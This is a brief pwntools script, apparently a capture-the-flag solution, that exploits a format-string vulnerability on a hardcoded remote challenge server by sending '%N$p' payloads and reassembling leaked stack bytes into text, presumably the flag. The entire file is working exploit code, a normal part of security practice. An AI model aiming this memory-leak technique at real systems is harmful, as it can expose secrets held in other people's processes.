#!/usr/bin/env python

from pwn import *

# r = remote('140.113.24.241', 30172)
# r = gdb.debug('./server-ctf-src/fmt/fmt', '''
#     break main
#     continue
# ''')

final = []
for i in range(10,15):
    r = remote('140.113.24.241', 30172)
    r.sendline('%{}$p'.format(i).encode())
    result = r.recv().decode("ASCII")
    by_str = bytes.fromhex(result.split("0x")[-1])
    ascii_str = by_str.decode("ASCII")[::-1]
    final.append(f"{ascii_str}")
    r.close()

for f in final:
    print(f, end="")
print()
